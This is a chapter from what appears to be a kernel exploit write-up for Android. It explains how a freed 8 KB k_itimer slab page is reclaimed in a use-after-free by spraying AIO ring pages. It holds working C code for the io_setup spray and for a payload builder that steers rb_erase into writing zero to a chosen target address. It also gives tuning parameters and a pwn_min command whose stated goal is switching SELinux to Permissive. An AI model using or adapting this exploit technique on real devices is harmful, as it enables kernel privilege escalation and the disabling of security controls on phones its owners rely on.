# 07 · Carriers: How to Reclaim That Page

[中文](../07-carriers.md) · **English**

> The essence of a UAF is that a target page is freed and then occupied again by content we
> control. This chapter covers the carriers we tried and why we ended up using AIO.

---

## 1. The problem to solve

```
1. The kernel frees the 8 KB slab containing k_itimer
2. Before anything else grabs it, we must reclaim it with a 4 KB page we control
3. The reclaimed page must contain our payload:
       node+0x00 = 0
       node+0x08 = 0
       node+0x10 = target
```

**The difficulty is step 2: the slab is order-1 (two contiguous physical pages). One user
mapping gives us only one page, so we must both "happen to get one of those two pages" and
know which one it was.**

---

## 2. Candidate carriers

| Carrier | Pages per unit | User-writable | Obtainable in bulk | Know which page we got |
|---|---|---|---|---|
| **pipe buffer** | 16 × 4 KB | yes | limited | no |
| **AF_UNIX socket buffer** | variable | yes | yes | no |
| **AIO ring (`io_setup`)** | several per context | yes | yes, easily | no |
| **VMA (`mmap`)** | 1 page | yes | capped | no |
| **perf ring** | 1 page | yes | yes | no |

---

## 3. The pipe problem: `pipe-user-pages-soft`

Our first implementation used pipes:

```c
for (i = 0; i < npipes; i++) {
    pipe(pfd);
    fcntl(pfd[1], F_SETPIPE_SZ, 4096 * 16);
    write(pfd[1], buf, 4096 * 16);
}
```

**Measured: only about 40 MB obtainable**, far from enough.

Cause: `/proc/sys/fs/pipe-user-pages-soft` caps the total number of pipe pages an
unprivileged user may hold (roughly 64 MB).

**⇒ the pipe carrier has too little capacity to cover an 8 KB slab's reclaim window.**

---

## 4. AIO: the real breakthrough

### 4.1 `io_setup` hands you user-writable, order-0, UNMOVABLE pages

```c
aio_context_t ctx = 0;
syscall(__NR_io_setup, 1, &ctx);     // each context maps a ring
```

**Measured data:**

```
$ /data/local/tmp/aio_probe
created 60000 AIO contexts, 0 failures
memory held: 234 MB
```

**60,000 contexts, 234 MB, zero failures.**

Compare with the pipe's 40 MB — **6× the capacity, and no failures.**

### 4.2 Why AIO pages are especially suitable

| Property | Why it helps |
|---|---|
| **order-0** | one page per allocation, exactly matching a split slab half |
| **UNMOVABLE** | will not be migrated by memory reclaim |
| **persistent** | stays allocated until `io_destroy` |
| **user-writable** | a plain `memset` lays out the payload |
| **large capacity** | 60,000 pages = 234 MB |

### 4.3 Implementation

```c
#define MAX_AIO 200000

static aio_context_t *g_ctx;

static int aio_spray(size_t pages)
{
    size_t n = 0;

    g_ctx = calloc(MAX_AIO, sizeof(*g_ctx));
    for (size_t i = 0; i < pages && i < MAX_AIO; i++) {
        g_ctx[i] = 0;
        if (syscall(__NR_io_setup, 1, &g_ctx[i]) == 0)
            n++;
        else
            g_ctx[i] = 0;
    }
    return (int)n;
}
```

**Note**: `io_setup` mmaps a ring into user space; that memory is where the payload goes.

---

## 5. The in-page phase problem (learned the hard way)

### 5.1 An 8 KB slab splits into two halves

An order-1 slab is two contiguous physical pages `page[N]` and `page[N+1]`.
When the slab is freed, the buddy allocator splits them back into order-0 free lists.

**Our AIO allocation gets only one of them, and which one is random.**

### 5.2 Three phases

If the payload repeats with a 24-byte period (`value`, `0`, `target`) across the whole page,
then depending on where the node falls inside the page, `rb_erase` sees different triples:

| Phase | node[0] | node[8] | node[0x10] | Branch taken | Write lands |
|---|---|---|---|---|---|
| **0** | 0 | 0 | target | `!tmp` (left child non-null) | ✅ `*(target) = 0` |
| **8** | 0 | target | 0 | `!tmp && !child` | ✅ `*(node[8]) = node[0]` → `*(target) = 0` |
| **16** | target | 0 | 0 | both children empty | ❌ only `*root = 0`, harmless |

**⇒ phases 0 and 8 both write; only 16 is wasted.**

### 5.3 But phase 8 has a side effect

The phase-8 branch additionally executes:

```asm
0x78e0  str  x8, [x11]       ; *root = target   <- writes a heap address into the timerqueue head
0x78e8  str  x9, [x8]        ; *(target) = 0     <- the write we want
```

**The write lands, but the timerqueue head is corrupted, and any later posix-timer operation
may crash.**

### 5.4 Our solution: a uniform phase

```c
/* make the whole page use one phase instead of alternating */
#define PAYLOAD_PERIOD 24

static void build_page(unsigned char *page, int phase,
                       uint64_t target)
{
    for (int off = phase; off + 24 <= 4096; off += PAYLOAD_PERIOD) {
        *(uint64_t *)(page + off + 0)  = 0;        /* value */
        *(uint64_t *)(page + off + 8)  = 0;        /* 0 */
        *(uint64_t *)(page + off + 16) = target;   /* target */
    }
}
```

We then pass phase **8** (measured to be more reliable than 0).

### 5.5 The thorough approach: compute the exact offset

See [08-exact-hit.md](08-exact-hit.md). If we know the victim's exact address we can compute
the node's in-page offset precisely, **so there is no need to guess the phase at all.**

---

## 6. Measured verdicts for the other carriers

| Carrier | Verdict |
|---|---|
| pipe | ❌ capacity capped at ~40 MB by `pipe-user-pages-soft` |
| socket 8KB | ⚠️ works, but `kmalloc-8k` is order-3 (`objperslab=4, pagesperslab=8`) and does not match an order-1 slab |
| VMA | ⚠️ bounded by `vm.max_map_count` |
| perf ring | ⚠️ one page per event, but count is limited by `perf_event_paranoid` and the fd limit |
| **AIO** | ✅ **60,000 pages / 234 MB / zero failures** |

**Shark implements all three carriers (filler = VMA / AIO / perf) and exposes three tuning
knobs: `PREFIX_DEFAULT 256`, `CHURN_DEFAULT 993`, `PCP_PRIME_DEFAULT 8192`.**

What they do:

| Parameter | Effect |
|---|---|
| **PREFIX** | perform N pre-allocations so the target page lands at a favourable depth |
| **CHURN** | allocate/free N times to shuffle freelist order |
| **PCP priming** | fill the per-CPU page list so subsequent allocations follow a deterministic path |

**These must be swept against the local slab layout — they cannot be copied.**

---

## 7. Our final recipe

```bash
# Stage A (turn SELinux Permissive)
/data/local/tmp/pwn_min 8 30000 1 aio same
#                        | |     | |    +- uniform phase (not alternating)
#                        | |     | +- AIO carrier
#                        | |     +- 1 page per unit (ignored in AIO mode)
#                        | +- 30000 units
#                        +- phase 8
```

**Success rate**: about 2/3 (the phase-16 case fails).

**Shark later solved this properly with EXACT HIT.**
